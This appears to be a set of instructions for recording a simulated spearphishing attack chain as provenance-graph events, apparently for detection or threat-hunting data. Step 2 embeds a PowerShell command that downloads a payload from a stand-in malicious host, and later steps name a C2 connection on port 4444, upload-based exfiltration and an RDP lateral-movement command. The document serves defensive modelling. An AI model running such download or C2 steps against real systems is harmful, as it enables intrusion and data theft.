1. **Identify Initial Access via Spearphishing Email**  
   - Map the event where the user opens the email and downloads the attachment.  
   - Target the `srcNode` as the Email Client (e.g., Outlook) with `Name` set to "Outlook" and `relation` as "Process Create".  
   - The `dstNode` should represent the downloaded attachment (e.g., "Update_Document.docx") with `Type` set to "File".  
   - Ensure the `timestamp` reflects the time of the email action.

2. **Capture Execution of Malicious Payload**  
   - Identify the event where the user opens the malicious Word document.  
   - Set `srcNode` as Microsoft Word with `Name` set to "WINWORD.EXE" and `relation` as "Process Create".  
   - The `dstNode` should be PowerShell with `Image` set to "powershell.exe" and `Cmdline` containing the PowerShell command: `Invoke-WebRequest -Uri http://malicious-server.com/payload.exe -OutFile C:\\Users\\Victim\\Downloads\\payload.exe`.  
   - Ensure the `timestamp` reflects the execution time of the PowerShell command.

3. **Log Payload Execution**  
   - Capture the event when the downloaded payload is executed.  
   - Set `srcNode` as Explorer with `Name` set to "explorer.exe" and `relation` as "Process Create".  
   - The `dstNode` should represent the payload executable (e.g., "payload.exe") with `Type` set to "Process".  
   - Ensure the `timestamp` reflects the time of the payload execution.

4. **Monitor for C2 Connection**  
   - Identify the outbound connection to the attacker's command and control server.  
   - Set `srcNode` as the payload executable (e.g., "payload.exe") with `relation` as "TCP Connect".  
   - The `dstNode` should represent the attacker's IP address with `Dstaddress` set to "attacker-ip" and `Port` set to 4444.  
   - Ensure the `timestamp` reflects the time of the connection.

5. **Track Data Exfiltration via Web Upload**  
   - Capture the HTTP POST request made to the cloud storage service for data exfiltration.  
   - Set `srcNode` as the established shell (e.g., "cmd.exe") with `relation` as "Process Create".  
   - The `dstNode` should represent the web browser (e.g., Chrome) with `Name` set to "chrome.exe" and `Cmdline` containing the upload URL: `https://cloud-storage.com/upload`.  
   - Ensure the `timestamp` reflects the time of the upload action.

6. **Detect Lateral Movement via RDP**  
   - Identify the event where the attacker initiates an RDP session to another internal system.  
   - Set `srcNode` as Explorer with `Name` set to "explorer.exe" and `relation` as "Process Create".  
   - The `dstNode` should represent the RDP connection with `Cmdline` containing the command: `mstsc /v:target-internal-ip`.  
   - Ensure the `timestamp` reflects the time of the RDP session initiation.
